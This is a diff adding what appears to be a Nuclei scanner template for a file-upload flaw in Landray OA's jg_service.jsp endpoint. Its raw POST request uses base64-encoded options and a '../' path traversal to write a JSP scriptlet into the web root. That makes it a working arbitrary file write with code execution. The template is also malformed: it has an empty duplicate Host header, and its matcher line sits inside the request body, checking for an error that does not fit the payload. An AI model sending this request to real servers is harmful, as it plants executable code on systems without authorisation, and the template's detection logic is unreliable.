@@ -1,0 +1,31 @@
+id: Landray-jg_service-upload
+
+info:
+  name: Landray-jg_service-upload
+  author: M9
+  severity: high
+  metadata:
+    verified: true
+
+http:
+  - raw:
+      - |
+        POST /sys/attachment/sys_att_main/jg_service.jsp  HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
+        Host: 
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        Content-type: application/x-www-form-urlencoded
+        Content-Length: 206
+
+        DBSTEP V3.0    124            0              999            
+        DBSTEP=REJTVEVQ
+        OPTION=U0FWRUFTSFRNTA==
+        HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL3N0Yy5qc3A=
+        RECORDID=
+        DIRECTORY=
+
+        <% out.println(111*11);%>
+        matcher: "\"java.lang.NumberFormatException\" in res.text"
